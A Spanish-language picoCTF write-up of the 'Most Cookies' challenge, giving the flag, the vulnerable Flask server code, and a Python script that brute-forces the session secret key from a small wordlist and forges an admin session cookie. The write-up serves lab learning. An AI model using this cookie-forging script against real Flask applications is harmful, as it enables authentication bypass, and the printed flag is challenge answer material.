# Retos picoCTF

# Level X

## Objetivo
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:44693/
## Solucion
picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}

Para este reto podemos ver en el archivo solve.py selecciona aleatoriamente de una lista de galletas para darnos asignar a nuestra session.

PAra esto hice uso de un programa en python que me encontré en internet para poder decodificar la cookie y que me de otra, por que el programa solve.py muestra que la galleta no es lo que busca, sino que la cookie tenga el valor de admin dentro de ella.
Así que se modifica la cookie, la ingreso en le buscador y refresco la pagina, dando como resultado la bandera.

'''´´´                                                            
┌──(kali㉿kali)-[~/Downloads/MostCookies]
└─$ ls 
index.html  server.py  solve.py
                                                                     
┌──(kali㉿kali)-[~/Downloads/MostCookies]
└─$ cat server.py    
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "blank":
                        return render_template("index.html", title=title)
                else:
                        return make_response(redirect("/display"))
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/search", methods=["GET", "POST"])
def search():
        if "name" in request.form and request.form["name"] in cookie_names:
                resp = make_response(redirect("/display"))
                session["very_auth"] = request.form["name"]
                return resp
        else:
                message = "That doesn't appear to be a valid cookie."
                category = "danger"
                flash(message, category)
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/reset")
def reset():
        resp = make_response(redirect("/"))
        session.pop("very_auth", None)
        return resp

@app.route("/display", methods=["GET"])
def flag():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "admin":
                        resp = make_response(render_template("flag.html", value=flag_value, title=title))
                        return resp
                flash("That is a cookie! Not very special though...", "success")
                return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

if __name__ == "__main__":
        app.run()

                                                                     
┌──(kali㉿kali)-[~/Downloads/MostCookies]
└─$ cat solve.py 
import hashlib
from itsdangerous import URLSafeTimedSerializer
from itsdangerous.exc import BadTimeSignature
from flask.sessions import TaggedJSONSerializer
def flask_cookie(secret_key, cookie_str, operation):
    # This function is a simplified version of the SecureCookieSessionInterface: https://github.com/pallets/flask/blob/020331522be03389004e012e008ad7db81ef8116/src/flask/sessions.py#L304.
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    if operation == "decode":
        return s.loads(cookie_str)
    else:
        return s.dumps(cookie_str)

# The list of possible secret keys used by the app.
possible_keys = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

# An encoded cookie pulled from the live application that can be used to guess the secret key.
cookie_str = "eyJ2ZXJ5X2F1dGgiOiJidXR0ZXIifQ.Z04OuQ.FXYQUWsvRO7bovp2KcXy1fgtgw8"

# For each possible key try to decode the cookie.
for possible_secret_key in possible_keys:
    try:
        cookie_decoded = flask_cookie(possible_secret_key, cookie_str, "decode")
    except BadTimeSignature:
        # If the decoding fails then try the next key.
        continue
    secret_key = possible_secret_key
    # Break the loop when we have the corret key.
    break

print("Secret Key: %s" % secret_key)

# The admin cookie has the `very_auth` value set to `admin`, which can be seen on line 46 of the server.py code.
admin_cookie = {"very_auth": "admin"}
# Encode the cookie used the `SecureCookieSessionInterface` logic.
admin_cookie_encoded = flask_cookie(secret_key, admin_cookie, "encode")

print("Admin Cookie: %s" % admin_cookie_encoded)

´´´

## Referencias


